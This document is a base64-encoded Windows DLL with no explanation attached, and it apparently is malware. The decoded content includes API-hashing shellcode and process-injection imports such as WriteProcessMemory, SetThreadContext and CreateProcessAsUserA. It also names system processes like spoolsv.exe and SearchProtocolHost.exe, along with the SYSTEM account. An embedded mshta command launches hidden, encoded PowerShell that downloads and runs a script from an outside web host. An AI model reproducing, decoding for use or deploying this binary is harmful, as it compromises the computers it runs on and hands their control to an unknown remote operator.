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
NP7gMRj1JLyrVqAV2cmvR4hvUn0pySDd4FHcVsTDieXB9TzxCu7cL/b+be3QNQ5eyc0YQ+QV8AOA1kRjjfjjrZjPVOvV2Jy96QZOA/sfA1riSjRH4sCWpvrO2mXU0Ry2WPxy6Avx/GuFxHQQ9qE6QS5gkQLUsDLlJZxPUtH00f3Mh4nEj+Hgnh//B4yjhNam7SbN1JbQEeUsh4Hw9HYX8TwHrLLdBsHQ3jUp2R7KWdxWbLbW5e3Bnn3JIIPU/JDv9k76/ukOQej
yxhdWSDZcJ1qgcFAwvuGn5tplOZgVAfkKYkUYp9tQvcn09egSft5ZJT7RHeUGRf3Qr09D5S3tGeEpnvonjM/g3Pwv3wNHhQpB+NY1DFHVOSJccu3A6/aki1bUS4C08mXcNtiyI/HY0m0CzJWayHZK6uTHrG/VxcwWxDBWTuKgo1JiwfBjiJL8nhtZ0cDe1qHoZ4jR+dncy4wPB62vS+JGfjT+zjOFII9W4c3wNqZdLtpk8e3EC4CU1eUEUQrd9OfWD/Ja7kkAR+
XUK/bBDeCSxZrItm7m+FQS0cgx/LwWQkwDiSXsndEZ/HHgT1r93MOssZ3FHgeFKhOMg4B2A1HxOek+6mHA9uXZGmI1yONaZZkp1PX4dSfxIfRDUqU8sBbdneS03PJtCkRVDk/WzNUdASwROGv2fNJa6QXMMHAj5sLKQKvgktr471biXtKi1JScNu78vFJKxP/zoggAAAGCJ5THAZItQMItSDItSFItyKA+3SiYx/6w8YXwCLCDBzw0Bx+LyUleLUhCLSjyLTBF4
40gB0VGLWSAB04tJGOM6SYs0iwHWMf+swc8NAcc44HX2A334O30kdeRYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4F9fWosS641dagGNhbIAAABQaDGLb4f/1bvgHSoKaKaVvZ3/1TwGfAqA++B1BbtHE3JvagBT/9Vtc2h0YSB2YnNjcmlwdDpjcmVhdGVvYmplY3QoIndzY3JpcHQuc2hlbGwiKS5ydW4oInBvd2Vyc2hlbGwgLW5vcCAtZSBKQUJ
zQUdZQVBRQWtBR1VBYmdCMkFEb0FkQUJ0QUhBQUt3QW5BRndBYXdCa0FHd0Fjd0E1QURJQWFnQnpBR29BY1FCekFEQUFMZ0IxQUhNQVlnQW5BRHNBYVFCbUFDZ0FJUUFvQUZRQVpRQnpBSFFBTFFCUUFHRUFkQUJvQUNBQUpBQnNBR1lBS1FBcEFIc0FTUUJGQUZnQUtBQk9BR1VBZHdBdEFFOEFZZ0JxQUdVQVl3QjBBQ0FBVXdCNUFITUFkQUJsQUcwQUxnQk
9BR1VBZEFBdUFGY0FaUUJpQUVNQWJBQnBBR1VBYmdCMEFDa0FMZ0JFQUc4QWR3QnVBR3dBYndCaEFHUUFVd0IwQUhJQWFRQnVBR2NBS0FBbkFHZ0FkQUIwQUhBQU9nQXZBQzhBZEFBdUFIb0FaUUJ5QURJQUxnQmpBRzhBYlFBdkFIVUFjd0JpQUM0QWFnQnpBSEFBSndBcEFEc0FiZ0JsQUhjQUxRQnBBSFFBWlFCdEFDQUFKQUJzQUdZQUlBQXRBSFFBZVFCd
0FHVUFJQUJtQUdrQWJBQmxBSDBBIiwwKSh3aW5kb3cuY2xvc2UpANAqrGv//////////wIAAABO5kC7sRm/RAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbGliZ2NqLTE2LmRsbABfSnZfUmVnaXN0ZXJDbGFzc2VzAAAAXFNlYXJjaFByb3RvY2
9sSG9zdC5leGUAcy0xLTUtMTgAc3Bvb2xzdi5leGUATUdZbkdZUGYAcnVuZGxsMzIuZXhlAAAAU6xrIFCsa8AerGtNaW5ndy13NjQgcnVudGltZSBmYWlsdXJlOgoAQWRkcmVzcyAlcCBoYXMgbm8gaW1hZ2Utc2VjdGlvbgAgIFZpcnR1YWxRdWVyeSBmYWlsZWQgZm9yICVkIGJ5dGVzIGF0IGFkZHJlc3MgJXAAAAAAICBWaXJ0dWFsUHJvdGVjdCBmYWlsZ
WQgd2l0aCBjb2RlIDB4JXgAACAgVW5rbm93biBwc2V1ZG8gcmVsb2NhdGlvbiBwcm90b2NvbCB2ZXJzaW9uICVkLgoAAAAgIFVua25vd24gcHNldWRvIHJlbG9jYXRpb24gYml0IHNpemUgJWQuCgAAAEdDQzogKEdOVSkgNS4zLjEgMjAxNTEyMDcAAABHQ0M6IChHTlUpIDUuMy4xIDIwMTYwMjExAAAAR0NDOiAoR05VKSA1LjMuMSAyMDE2MDIxMQAAAEdD
QzogKEdOVSkgNS4zLjEgMjAxNTEyMDcAAABHQ0M6IChHTlUpIDUuMy4xIDIwMTUxMjA3AAAAR0NDOiAoR05VKSA1LjMuMSAyMDE1MTIwNwAAAEdDQzogKEdOVSkgNS4zLjEgMjAxNTEyMDcAAABHQ0M6IChHTlUpIDUuMy4xIDIwMTUxMjA3AAAAR0NDOiAoR05VKSA1LjMuMSAyMDE1MTIwNwAAAEdDQzogKEdOVSkgNS4zLjEgMjAxNTEyMDcAAABHQ0M6ICh
HTlUpIDUuMy4xIDIwMTUxMjA3AAAAR0NDOiAoR05VKSA1LjMuMSAyMDE1MTIwNwAAAEdDQzogKEdOVSkgNS4zLjEgMjAxNTEyMDcAAABHQ0M6IChHTlUpIDUuMy4xIDIwMTUxMjA3AAAAR0NDOiAoR05VKSA1LjMuMSAyMDE1MTIwNwAAAEdDQzogKEdOVSkgNS4zLjEgMjAxNjAyMTEAAABHQ0M6IChHTlUpIDUuMy4xIDIwMTUxMjA3AAAAR0NDOiAoR05VKS
A1LjMuMSAyMDE2MDIxMQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAhIwNaAAAAAChgAAABAAAAAQAAAAEAA
AA0YAAAOGAAADxgAAB0ZW1wLmRsbAAAAACEGwAAPmAAAAAARGxsTWFpbkAxMgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUHAAAAAAAAAAAAAAzHYAAFxxAABwcAAAAAAAAAAAAAB8dwAAfHEAABRxAAAAAAAAAAAAANB3AAAgcgAAAAAAAAAAAAAAAAAAAAAAAAAAAABocgAAgnIAAIxyAACkcgAAsHIAAMByAADWcgAAAAAAAOpyAA
D4cgAACHMAABhzAAA0cwAATHMAAGRzAACAcwAAlHMAAKpzAADAcwAA0HMAAOZzAAD6cwAAEHQAACJ0AAA0dAAATnQAAGJ0AABydAAAfnQAAJp0AACydAAAwHQAAMx0AADadAAA7HQAAPx0AAAWdQAAJnUAADp1AABYdQAAYHUAAHR1AACCdQAAnnUAALB1AADCdQAA0nUAAOh1AAAAAAAA/nUAAAx2AAAadgAAJnYAAC52AAA2dgAAQHYAAEx2AABWdgAAXnYAA
Gh2AABydgAAfHYAAIZ2AACQdgAAmnYAAKJ2AAAAAAAAaHIAAIJyAACMcgAApHIAALByAADAcgAA1nIAAAAAAADqcgAA+HIAAAhzAAAYcwAANHMAAExzAABkcwAAgHMAAJRzAACqcwAAwHMAANBzAADmcwAA+nMAABB0AAAidAAANHQAAE50AABidAAAcnQAAH50AACadAAAsnQAAMB0AADMdAAA2nQAAOx0AAD8dAAAFnUAACZ1AAA6dQAAWHUAAGB1AAB0dQAA
gnUAAJ51AACwdQAAwnUAANJ1AADodQAAAAAAAP51AAAMdgAAGnYAACZ2AAAudgAANnYAAEB2AABMdgAAVnYAAF52AABodgAAcnYAAHx2AACGdgAAkHYAAJp2AACidgAAAAAAAHMAQ29udmVydFN0cmluZ1NpZFRvU2lkQQAAdgBDb3B5U2lkAHsAQ3JlYXRlUHJvY2Vzc0FzVXNlckEAAAcBRXF1YWxTaWQAADYBR2V0TGVuZ3RoU2lkAABgAUdldFRva2VuSW5
mb3JtYXRpb24A/gFPcGVuUHJvY2Vzc1Rva2VuAABTAENsb3NlSGFuZGxlAJ4AQ3JlYXRlTXV0ZXhBAAC3AENyZWF0ZVRocmVhZAAAwABDcmVhdGVUb29saGVscDMyU25hcHNob3QAANQARGVsZXRlQ3JpdGljYWxTZWN0aW9uAO8ARW50ZXJDcml0aWNhbFNlY3Rpb24AAGUBRnJlZUxpYnJhcnlBbmRFeGl0VGhyZWFkAADEAUdldEN1cnJlbnRQcm9jZXNzAM
UBR2V0Q3VycmVudFByb2Nlc3NJZADJAUdldEN1cnJlbnRUaHJlYWRJZAAAAwJHZXRMYXN0RXJyb3IAABMCR2V0TW9kdWxlRmlsZU5hbWVBAAAVAkdldE1vZHVsZUhhbmRsZUEAABYCR2V0TW9kdWxlSGFuZGxlRXhBAABFAkdldFByb2NBZGRyZXNzAABKAkdldFByb2Nlc3NIZWFwAAB7AkdldFN5c3RlbVRpbWVBc0ZpbGVUaW1lAIkCR2V0VGhyZWFkQ29ud
GV4dAAAlwJHZXRUaWNrQ291bnQAANACSGVhcEFsbG9jAOsCSW5pdGlhbGl6ZUNyaXRpY2FsU2VjdGlvbgAmA0xlYXZlQ3JpdGljYWxTZWN0aW9uAAAyA0xvY2FsQWxsb2MAADYDTG9jYWxGcmVlAG8DT3BlblByb2Nlc3MAgQNQcm9jZXNzMzJGaXJzdAAAgwNQcm9jZXNzMzJOZXh0AJMDUXVlcnlQZXJmb3JtYW5jZUNvdW50ZXIA1gNSZXN1bWVUaHJlYWQA
AFUEU2V0VGhyZWFkQ29udGV4dAAAZwRTZXRVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIAdARTbGVlcACCBFRlcm1pbmF0ZVByb2Nlc3MAAIkEVGxzR2V0VmFsdWUAlgRVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIAAK4EVmlydHVhbEFsbG9jRXgAALYEVmlydHVhbFByb3RlY3QAALkEVmlydHVhbFF1ZXJ5AADCBFdhaXRGb3JTaW5nbGVPYmplY3QA+ARXcml
0ZVByb2Nlc3NNZW1vcnkAADcAX19kbGxvbmV4aXQAjgBfYW1zZ19leGl0AAAwAV9pbml0dGVybQA0AV9pb2IAAJUBX2xvY2sAMgJfb25leGl0ALECX3N0cmljbXAAAEYDY2FsbG9jAABnA2ZyZWUAAHIDZndyaXRlAACeA21hbGxvYwAAzANzdHJjbXAAANMDc3RybGVuAADWA3N0cm5jbXAA6gNfdW5sb2NrADsEYWJvcnQAVwR2ZnByaW50ZgAAAAAAcAAAAH
AAAABwAAAAcAAAAHAAAABwAAAAcAAAQURWQVBJMzIuZGxsAAAAABRwAAAUcAAAFHAAABRwAAAUcAAAFHAAABRwAAAUcAAAFHAAABRwAAAUcAAAFHAAABRwAAAUcAAAFHAAABRwAAAUcAAAFHAAABRwAAAUcAAAFHAAABRwAAAUcAAAFHAAABRwAAAUcAAAFHAAABRwAAAUcAAAFHAAABRwAAAUcAAAFHAAABRwAAAUcAAAFHAAABRwAAAUcAAAFHAAABRwAABLR
VJORUwzMi5kbGwAAAAAKHAAAChwAAAocAAAKHAAAChwAAAocAAAKHAAAChwAAAocAAAKHAAAChwAAAocAAAKHAAAChwAAAocAAAKHAAAChwAABtc3ZjcnQuZGxsAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEKxrAAAAAAAAAADAHqxrcB6sawAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAkKxrHJCsa2xTrGsYgKxrAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAwBAAAdMCIwTzBiMGcwhzCQMNcw+jAFMRMxIDE2MVwxgTGUMcIxzDHYMeI
xAjIUMhsyITJIMk8yWjKBMogy5zIFNEc0UjRYNGI0bDR1NIU0jjTLNNY0+DRJNY01yTUmNjo2VTZnNoI2vDbgNv02gDe9NxI4JThEOFA4bDiOOKM44TjtOBg5MTlWOYY5lzmrOcc5NTpGOnQ6pTrUOt06CzscOyw7QztgO3U7tTvbO+w7Jzw/PFk8kTyjPK88xjzWPOI8/DwRPSI9OD1WPWs9fD2EPYw9mz2+PcM96D34PQk+Dj4TPhs+ID4oPjE+Oz5BPko+Wz
